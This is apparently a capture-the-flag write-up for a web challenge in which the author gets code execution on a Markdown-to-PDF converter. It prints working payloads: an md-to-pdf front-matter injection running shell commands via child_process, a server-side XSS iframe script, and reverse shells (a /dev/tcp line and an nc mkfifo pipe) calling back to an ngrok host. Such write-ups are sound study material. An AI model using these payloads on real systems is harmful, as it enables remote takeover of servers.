---
title: Mythic PDF Forge
date: 2023-12-10T13:37:49+02:00
description: Writeup for Mythic PDF Forge [OddessyCTF]
author: 1byteBoy
tags:
  - Web
draft: false
---

This challenge gave us a web link to a website that converts Markdown formats to PDF format. 

All we have to do here is to write the marks down text or any text and then press generate. We can simply test this by doing the following 

Form Box

```
# Hello World
*This is a test*
```

Then press **`Generate`** button

we see that it opens a PDF page, where it converts or renders the markdown. OK so how do we exploit it !?

First thing i did is to google search *Markdown to PDF vulnerability and exploit*.

One of the page was https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880

which talks about a possible `Remote Code Execution` in <u>md-to-pdf</u> package for versions <5.0.0, the thing is we don't know the version that is used here, until we check the inspect element page in PDF page, which shows

`PDF 6a3105f7f1140b692f023a47278f6ba1 [1.4 Skia/PDF m115 / Chromium] (PDF.js: 2.15.305)`

still not sure though skill issue =) 

but anyways let's try one of the payload from the snyk page that it suggests


```js
---js
((require("child_process")).execSync("id > /tmp/RCE.txt && cat /tmp/RCE.txt"))
---RCE';
```

it doesn't show anything nor does any other command, maybe it's it executing in the server-side only 

so since we are doing XSS and if it's executing in the server side, so i looked up for some Server Side XSS related to PDF and found some documentation on hack-tricks

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf

and yes most of the payload from there was working. Even the following payload worked and showed something about a resume 

```js
<script>
document.write('<iframe src="'+window.location.href+'"></iframe>')
</script>
```

unfortunately only after trying different thing for a minute it wasn't working anymore, and showing us an API error from the backend.

I tried other things but nothing was helping out.. I tried reading different bug bounty writeups, GitHub issues there it seems it was talking about the previous payload and a possible RCE.

I found a YouTube video of John Hammond https://www.youtube.com/watch?v=QVaf4DMYPFc

Where he explains and tried to get a RCE the process is as follows

- set up a `netcat` listener on port `9999`
- then forward that port to the internet using `ngrok` : `ngrok tcp 9999`
- create a reverse shell using https://www.revshells.com/
	- use ip as `0.tcp.in.ngrok.io`
	- and port that is after it `:<port>` 
	- paste those in the ip&port section and we have a reverse shell code

Now let's create the payload 

```js
---js
((require("child_process")).execSync("sh -i >& /dev/tcp/0.tcp.in.ngrok.io/<forwarded_ip> 0>&1"))
---RCE
```

the only thing here is it wan't working, i was tired and sleepy so i left but the next day my teammate `@Soham5007v` found out the issue or problem. The thing is we have to use a different kind of reverse shell.

In the revsheels.com we can see a section as `nc mkfifo` that's what we have to use, why neither of us know, he just tried one after another.

anyways so now the payload would look something like 

```js
---js
((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 0.tcp.in.ngrok.io <forwarded_ip> >/tmp/f"))
---RCE
```

and whalla we get the shell, now we can cat the file named `flag.txt` and read the flag

Flag : **`flag{un1esh_t4e_f0rge_666f726765}`**




